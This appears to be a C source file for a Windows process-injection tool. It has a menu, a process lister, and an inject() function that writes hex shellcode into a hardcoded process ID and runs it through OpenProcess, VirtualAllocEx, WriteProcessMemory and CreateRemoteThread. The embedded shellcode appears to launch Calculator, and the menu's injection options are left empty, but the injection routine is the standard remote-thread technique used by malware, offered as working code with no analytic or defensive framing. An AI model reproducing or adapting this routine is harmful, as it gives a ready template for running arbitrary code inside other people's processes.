#define _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_NO_DEPRECATE  
#define _CRT_NONSTDC_NO_DEPRECATE

#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <stdio.h>
#include <conio.h>
#include <stdlib.h>

BOOL procList(void);
int input(void);

int main() {
    while (TRUE) {
        int choice, num;
        printf("[1]Begin Injection\n");
        printf("[2]Test Injection\n");
        printf("[3]List Processes\n");
        printf("\033[36mEnter your choice:\033[0m\n");
        choice = input();

        switch (choice) {
        case 1: {

            break;
        }
        case 2: {

            break;
        }
        case 3: {
            procList();
            system("cls");
            procList();
            break;
        }
        default:
            printf("wrong Input\n");

        }

    }
    
    
	return 0;
}
int input()
{
    int number;
    printf("\033[36m>");
    scanf_s("%d", &number);
    return (number);
}
BOOL procList(void) {
    HANDLE hProcessSnap;
    HANDLE hProcess;
    PROCESSENTRY32 pe32;
    DWORD dwPriorityClass;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        puts("\033[31mERORR - UNABLE TO MAKE PROCESS SNAPSHOT \n\033[0m ");
        return(FALSE);
    }
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Check if able to get first proccess if Error is Spawned exit [return(FALSE)].
    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        return(FALSE);
    }

    do
    {
        _tprintf(TEXT("\nPID:\033[31m%d\033[0m: [\033[36m%s\033[0m]"), pe32.th32ProcessID, pe32.szExeFile);


    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return(TRUE);   
}
void inject() {
    char shellCode[] = \
        "\x31\xc9\xf7\xe1\x64\x8b\x41"
        "\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b"
        "\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01"
        "\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01"
        "\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78"
        "\x0a\x72\x65\x73\x73\x75\xeb\x8b\x72\x24\x01"
        "\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde"
        "\x8b\x14\x8e\x01\xda\x89\xd5\x31\xc9\x68\x73"
        "\x41\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68"
        "\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43"
        "\x72\x65\x61\x54\x53\xff\xd2\x31\xc9\xb1\xff"
        "\x31\xff\x57\xe2\xfd\x68\x63\x61\x6c\x63\x89"
        "\xe1\x51\x51\x31\xd2\x52\x52\x52\x52\x52\x52"
        "\x51\x52\xff\xd0\x83\xc4\x10\x68\x65\x73\x73"
        "\x61\x66\x83\x6c\x24\x03\x61\x68\x50\x72\x6f"
        "\x63\x68\x45\x78\x69\x74\x54\x53\xff\xd5\x31"
        "\xc9\x51\xff\xd0";
    HANDLE hProcess; // Handle to store remote process handle
    HANDLE hThread;
    void* exec_mem;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 1352);
    exec_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, exec_mem, shellCode, sizeof(shellCode), NULL);
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0);
    CloseHandle(hProcess);
}